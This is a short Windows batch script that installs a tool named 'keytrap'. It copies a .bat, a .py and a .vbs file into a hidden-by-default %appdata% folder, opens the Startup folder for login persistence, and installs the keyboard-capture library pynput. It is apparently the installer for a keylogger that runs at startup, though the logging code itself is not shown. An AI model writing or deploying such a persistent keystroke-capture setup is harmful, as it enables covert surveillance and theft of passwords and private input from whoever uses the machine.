mkdir %appdata%\keytrap
copy keytrap.bat %appdata%\keytrap\
copy keytrap.py %appdata%\keytrap\
copy keytrap-s.vbs %appdata%\keytrap\
explorer %appdata%\keytrap\
explorer %appdata%\Microsoft\Windows\Start Menu\Programs\Startup\
echo "Install python if not present"
python --version
echo "Assuming python is installed. installing pynput"
python -m pip install pynput


pause
